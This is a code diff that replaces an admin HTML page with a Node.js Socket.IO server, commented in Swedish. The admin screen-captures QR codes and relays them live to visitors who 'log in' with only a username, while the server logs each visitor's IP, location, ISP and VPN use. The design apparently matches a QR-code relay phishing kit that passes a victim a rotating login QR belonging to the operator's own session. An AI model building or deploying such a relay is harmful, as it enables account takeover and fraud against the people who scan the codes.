@@ -1,112 +1,220 @@
-<!doctype html>
-<html lang="en">
-<head>
-<meta charset="utf-8" />
-<meta name="viewport" content="width=device-width,initial-scale=1" />
-<title>Admin Panel - Support QR</title>
-<script src="/socket.io/socket.io.js"></script>
-<script src="https://cdn.jsdelivr.net/npm/jsqr@1.4.0/dist/jsQR.min.js"></script>
-<style>
-body {
-  font-family: "Segoe UI", Arial, sans-serif;
-  background: #f8f9fa;
-  margin: 0;
-  padding: 25px;
-  display: flex;
-  flex-direction: column;
-  align-items: center;
+'use strict';
+
+const express = require('express');
+const http = require('http');
+const { Server } = require('socket.io');
+const path = require('path');
+const axios = require('axios');
+const cookieParser = require('cookie-parser');
+
+const app = express();
+app.use(cookieParser());
+app.use(express.urlencoded({ extended: true }));
+app.use(express.static(path.join(__dirname, 'public')));
+
+const server = http.createServer(app);
+const io = new Server(server, { pingInterval: 10000, pingTimeout: 5000 });
+
+// ---------------------------- Helpers ----------------------------
+function cookieExpiryAtUTCMidnight() {
+  const d = new Date();
+  d.setUTCHours(23, 59, 59, 999);
+  return d;
 }
-.panel {
-  background: white;
-  padding: 20px;
-  border-radius: 12px;
-  box-shadow: 0 0 10px rgba(0,0,0,0.1);
-  width: 100%;
-  max-width: 900px;
+
+function flagEmoji(code) {
+  if (!code || code.length !== 2) return '';
+  return String.fromCodePoint(...[...code.toUpperCase()].map(c => 0x1F1E6 - 65 + c.charCodeAt(0)));
 }
-.controls { display:flex; flex-wrap:wrap; gap:10px; justify-content:center; margin-bottom:15px; }
-button, input { padding:8px 14px; border:none; border-radius:6px; font-weight:600; cursor:pointer; }
-button.start { background:#007bff; color:white; }
-button.stop { background:#dc3545; color:white; }
-button.hide { background:#6c757d; color:white; }
-button.pause { background:#ffc107; color:black; }
-button:hover { opacity:0.9; }
-#qrPreview {
-  background:white; border-radius:10px; padding:20px; box-shadow:0 0 6px rgba(0,0,0,0.1);
-  display:flex; align-items:center; justify-content:center; min-height:260px; margin-bottom:20px;
+
+function normalizeISP(raw) {
+  if (!raw) return 'Okänd';
+  const low = raw.toLowerCase();
+  const map = [
+    { k: ['ethionet', 'ethiotelecom'], n: 'Ethio Telecom' },
+    { k: ['safaricom', 'vodafone'], n: 'Safaricom' },
+    { k: ['mtn'], n: 'MTN' },
+    { k: ['airtel'], n: 'Airtel' },
+    { k: ['aws', 'amazon'], n: 'Amazon Web Services' },
+    { k: ['azure', 'microsoft'], n: 'Microsoft Azure' },
+    { k: ['oracle'], n: 'Oracle Cloud' },
+    { k: ['ovh'], n: 'OVHcloud' },
+    { k: ['hetzner'], n: 'Hetzner' },
+    { k: ['cloudflare'], n: 'Cloudflare' },
+    { k: ['starlink'], n: 'Starlink' },
+    { k: ['contabo'], n: 'Contabo' }
+  ];
+  for (const e of map) if (e.k.some(k => low.includes(k))) return e.n;
+  return raw;
 }
-#statusText { text-align:center; font-weight:bold; margin-bottom:10px; }
-.intervalBox { display:flex; align-items:center; gap:5px; }
-.intervalBox input { width:80px; border:1px solid #ccc; text-align:right; }
-video { display:none; }
-table { width:100%; border-collapse:collapse; font-size:0.9rem; }
-th, td { border:1px solid #ddd; padding:6px 8px; text-align:center; }
-th { background:#e9ecef; }
-</style>
-</head>
-<body>
-<div class="panel">
-  <h2>Admin Panel - Support QR</h2>
-  <div class="controls">
-    <button class="start" id="startBtn">Start Stream</button>
-    <button class="stop" id="stopBtn">Stop Stream</button>
-    <button class="hide" id="hideBtn">Hide</button>
-    <button class="pause" id="pauseBtn">Pause</button>
-    <div class="intervalBox">
-      <label>Scan Interval (s):</label>
-      <input id="intervalInput" type="number" step="0.05" min="0.25" max="5" value="0.5">
-    </div>
-  </div>
-  <div id="qrPreview">No active QR</div>
-  <div id="statusText">Status: Inactive</div>
-  <video id="video" autoplay muted></video>
-  <canvas id="canvas"></canvas>
-  <table>
-    <thead><tr><th>Name</th><th>IP</th><th>City</th><th>Region</th><th>Country</th><th>ISP</th><th>VPN</th><th>Ping (ms)</th></tr></thead>
-    <tbody id="clientBody"></tbody>
-  </table>
-</div>
 
-<script>
-const socket = io();
-let isStreaming=false, isHidden=false, isPaused=false, currentQR=null, scanInterval=500;
-let stream=null, detectLoop=null;
+async function lookupIP(ip) {
+  if (!ip || ip.startsWith('127.') || ip.startsWith('::1')) {
+    return { ip, city: 'Lokal', region: 'Lokal', country: 'Lokal', countryFlag: '🏠', isp: 'Lokalt nätverk', vpn: false };
+  }
+  try {
+    const r = await axios.get(`https://ipapi.co/${ip}/json/`);
+    return {
+      ip,
+      city: r.data.city || 'Okänd',
+      region: r.data.region || 'Okänd',
+      country: r.data.country_name || 'Okänd',
+      countryFlag: flagEmoji(r.data.country_code || ''),
+      isp: normalizeISP(r.data.org || r.data.isp),
+      vpn: !!(r.data.proxy || r.data.anonymous)
+    };
+  } catch {
+    return { ip, city: 'Okänd', region: 'Okänd', country: 'Okänd', countryFlag: '', isp: 'Okänd', vpn: false };
+  }
+}
 
-const video=document.getElementById('video');
-const canvas=document.getElementById('canvas');
-const qrPreview=document.getElementById('qrPreview');
-const statusText=document.getElementById('statusText');
-const clientBody=document.getElementById('clientBody');
-const intervalInput=document.getElementById('intervalInput');
+// ---------------------------- Routes ----------------------------
 
-socket.emit('join','admin');
+// Login
+app.get('/login', (_, res) => res.sendFile(path.join(__dirname, 'public', 'login.html')));
+app.post('/api/login', (req, res) => {
+  const username = req.body.username?.trim();
+  if (!username) return res.status(400).send('Användarnamn krävs');
+  res.cookie('username', username, {
+    expires: cookieExpiryAtUTCMidnight(),
+    httpOnly: true,
+    sameSite: 'Lax'
+  });
+  res.redirect('/');
+});
 
-socket.on('client_list',updateClients);
-socket.on('state',(s)=>{isStreaming=s.isStreaming;isHidden=s.isHidden;currentQR=s.currentQrValue;updateStatus();updatePreview();});
-socket.on('hide_state',(hidden)=>{isHidden=hidden;updateStatus();updatePreview();});
-socket.on('qr_preview',(v)=>{if(!isStreaming||isPaused)return;if(!isHidden&&v){currentQR=v;qrPreview.innerHTML=`<img src="https://api.qrserver.com/v1/create-qr-code/?size=256x256&data=${encodeURIComponent(v)}">`;}});
+// ✅ Verify session route (fixes your “Cannot GET /api/verify”)
+app.get('/api/verify', (req, res) => {
+  const username = req.cookies?.username;
+  if (username) return res.json({ valid: true, username });
+  res.json({ valid: false });
+});
 
-function updateStatus(){let s=[];if(isStreaming)s.push('Streaming');if(isHidden)s.push('Hidden');if(isPaused)s.push('Paused');statusText.textContent=`Status: ${s.length?s.join(' / '):'Inactive'}`;}
-function updatePreview(){if(isHidden)qrPreview.textContent='QR is hidden';else if(!currentQR)qrPreview.textContent='No active QR';else qrPreview.innerHTML=`<img src="https://api.qrserver.com/v1/create-qr-code/?size=256x256&data=${encodeURIComponent(currentQR)}">`;}
+// Admin & main client routes
+app.get('/broadcast', (_, res) => res.sendFile(path.join(__dirname, 'public', 'admin.html')));
+app.get('/', (req, res) => {
+  if (!req.cookies.username) return res.redirect('/login');
+  res.sendFile(path.join(__dirname, 'public', 'client.html'));
+});
 
-// buttons
-document.getElementById('startBtn').onclick=async()=>{
-  try{
-    stream=await navigator.mediaDevices.getDisplayMedia({video:true});
-    video.srcObject=stream;
-    socket.emit('start_stream');
-    isStreaming=true;updateStatus();
-    runDetection();
-  }catch(e){alert('Failed to start: '+e.message);}
-};
-document.getElementById('stopBtn').onclick=()=>{if(detectLoop)clearInterval(detectLoop);if(stream)stream.getTracks().forEach(t=>t.stop());socket.emit('stop_stream');isStreaming=false;currentQR=null;updatePreview();updateStatus();};
-document.getElementById('hideBtn').onclick=()=>{isHidden=!isHidden;socket.emit('toggle_hide',isHidden);updateStatus();updatePreview();document.getElementById('hideBtn').textContent=isHidden?'Unhide':'Hide';};
-document.getElementById('pauseBtn').onclick=()=>{isPaused=!isPaused;updateStatus();document.getElementById('pauseBtn').textContent=isPaused?'Resume':'Pause';};
+// ---------------------------- Socket.IO ----------------------------
+let adminSocket = null;
+const clients = new Map();
+let isStreaming = false;
+let isHidden = false;
+let currentQrValue = null;
 
-intervalInput.oninput=()=>{let v=parseFloat(intervalInput.value);if(isNaN(v)||v<0.25)v=0.25;if(v>5)v=5;scanInterval=v*1000;if(detectLoop){clearInterval(detectLoop);runDetection();}};
+function getClientList() {
+  return Array.from(clients.entries()).map(([id, c]) => ({ id, ...c }));
+}
 
-function runDetection(){if(detectLoop)clearInterval(detectLoop);const ctx=canvas.getContext('2d');detectLoop=setInterval(()=>{if(!isStreaming||isPaused||!video.videoWidth)return;canvas.width=video.videoWidth;canvas.height=video.videoHeight;ctx.drawImage(video,0,0,canvas.width,canvas.height);const img=ctx.getImageData(0,0,canvas.width,canvas.height);const code=jsQR(img.data,img.width,img.height);if(code&&code.data&&code.data!==currentQR){currentQR=code.data;if(!isHidden)qrPreview.innerHTML=`<img src="https://api.qrserver.com/v1/create-qr-code/?size=256x256&data=${encodeURIComponent(code.data)}">`;socket.emit('qr_update',code.data);}},scanInterval);}
-function updateClients(list){clientBody.innerHTML='';list.forEach(c=>{const tr=document.createElement('tr');tr.innerHTML=`<td>${c.username}</td><td>${c.ip}</td><td>${c.city}</td><td>${c.region}</td><td>${c.country} ${c.countryFlag||''}</td><td>${c.isp}</td><td>${c.vpn?'Yes':'No'}</td><td>${c.ping}</td>`;clientBody.appendChild(tr);});}
-</script>
-</body>
-</html>
+io.on('connection', (socket) => {
+  // Gäst (från login.html)
+  socket.on('join_guest', async (guestLabel = 'Okänd') => {
+    const ip = socket.handshake.headers['x-forwarded-for']?.split(',')[0] || socket.handshake.address;
+    const info = await lookupIP(ip);
+    clients.set(socket.id, {
+      username: `${guestLabel} (Inte inloggad ännu)`,
+      ...info,
+      ping: 0
+    });
+    socket.join('clients');
+    if (adminSocket) adminSocket.emit('client_list', getClientList());
+    console.log(`Gäst anslöt (${ip})`);
+  });
+
+  // Inloggad klient
+  socket.on('join', async (role) => {
+    if (role === 'admin') {
+      if (adminSocket) {
+        socket.emit('error', 'Admin redan ansluten');
+        socket.disconnect();
+        return;
+      }
+      adminSocket = socket;
+      socket.emit('state', { isStreaming, isHidden, currentQrValue });
+      socket.emit('client_list', getClientList());
+      console.log('Admin ansluten');
+      return;
+    }
+
+    if (role === 'client') {
+      const cookie = socket.handshake.headers.cookie || '';
+      const username = cookie.split('username=')[1]?.split(';')[0] || 'Okänd';
+      const ip = socket.handshake.headers['x-forwarded-for']?.split(',')[0] || socket.handshake.address;
+      const info = await lookupIP(ip);
+
+      if (clients.has(socket.id)) {
+        clients.set(socket.id, { ...clients.get(socket.id), username });
+      } else {
+        clients.set(socket.id, { username, ...info, ping: 0 });
+      }
+
+      socket.join('clients');
+      if (isStreaming && !isHidden && currentQrValue) socket.emit('qr_update', currentQrValue);
+      if (adminSocket) adminSocket.emit('client_list', getClientList());
+      console.log(`Klient inloggad: ${username} (${ip})`);
+    }
+  });
+
+  // QR-sändning från admin
+  socket.on('start_stream', () => {
+    if (socket !== adminSocket) return;
+    isStreaming = true;
+    io.to('clients').emit('stream_status', true);
+  });
+
+  socket.on('stop_stream', () => {
+    if (socket !== adminSocket) return;
+    isStreaming = false;
+    currentQrValue = null;
+    io.to('clients').emit('qr_update', null);
+  });
+
+  // Dölj/visa QR
+  socket.on('toggle_hide', (hide) => {
+    if (socket !== adminSocket) return;
+    isHidden = !!hide;
+    io.to('clients').emit('qr_update', isHidden ? null : currentQrValue);
+    if (adminSocket) adminSocket.emit('hide_state', isHidden);
+  });
+
+  // QR-uppdatering
+  socket.on('qr_update', (val) => {
+    if (socket !== adminSocket || !isStreaming) return;
+    if (val && val !== currentQrValue) {
+      currentQrValue = val;
+      if (!isHidden) io.to('clients').emit('qr_update', val);
+      if (adminSocket) adminSocket.emit('qr_preview', val);
+    }
+  });
+
+  // Ping/pong
+  socket.on('pong', (t) => {
+    const ping = Date.now() - t;
+    if (clients.has(socket.id)) {
+      const c = clients.get(socket.id);
+      clients.set(socket.id, { ...c, ping });
+      if (adminSocket) adminSocket.emit('client_list', getClientList());
+    }
+  });
+
+  // Frånkoppling
+  socket.on('disconnect', () => {
+    if (socket === adminSocket) {
+      adminSocket = null;
+      isStreaming = false;
+      console.log('Admin frånkopplad');
+    } else {
+      clients.delete(socket.id);
+      if (adminSocket) adminSocket.emit('client_list', getClientList());
+    }
+  });
+});
+
+// Pingloop
+setInterval(() => io.emit('ping', Date.now()), 5000);
+
+// ---------------------------- Start server ----------------------------
+const PORT = process.env.PORT || 5000;
+server.listen(PORT, '0.0.0.0', () => console.log(`✅ Server körs på port ${PORT}`));
